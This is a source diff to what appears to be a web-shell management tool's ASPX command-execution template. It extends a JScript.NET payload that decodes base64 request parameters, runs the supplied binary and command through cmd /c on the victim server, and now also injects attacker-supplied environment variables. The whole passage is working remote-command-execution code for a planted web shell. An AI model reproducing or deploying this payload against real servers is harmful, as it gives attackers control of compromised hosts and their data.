+++ source/core/aspx/template/command.js
@@ -2,11 +2,36 @@
  * 命令执行模板
  */
 
-module.exports = (arg1, arg2) => ({
+module.exports = (arg1, arg2, arg3) => ({
   exec: {
-    _: `var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"]));e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd()+EI.ReadToEnd());`,
+    _: `var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));
+    var e=new System.Diagnostics.Process();
+    var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+    c.UseShellExecute=false;
+    c.RedirectStandardOutput=true;
+    c.RedirectStandardError=true;
+    e.StartInfo=c;
+    c.Arguments="/c "+System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"]));
+    if(Request.Item["${arg3}"]) {
+      var envstr = System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg3}"]));
+      var envarr = envstr.split("|||asline|||");
+      var i;
+      for (var i in envarr) {
+        var ss = envarr[i].split("|||askey|||");
+        if (ss.length != 2) {
+          continue;
+        }
+        c.EnvironmentVariables.Add(ss[0],ss[1]);
+      }
+    }
+    e.Start();
+    out=e.StandardOutput;
+    EI=e.StandardError;
+    e.Close();
+    Response.Write(out.ReadToEnd() + EI.ReadToEnd());`.replace(/\n\s+/g, ''),
     [arg1]: "#{base64::bin}",
-    [arg2]: "#{base64::cmd}"
+    [arg2]: "#{base64::cmd}",
+    [arg3]: "#{base64::env}"
   },
   listcmd: {
     _: `var binarr=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));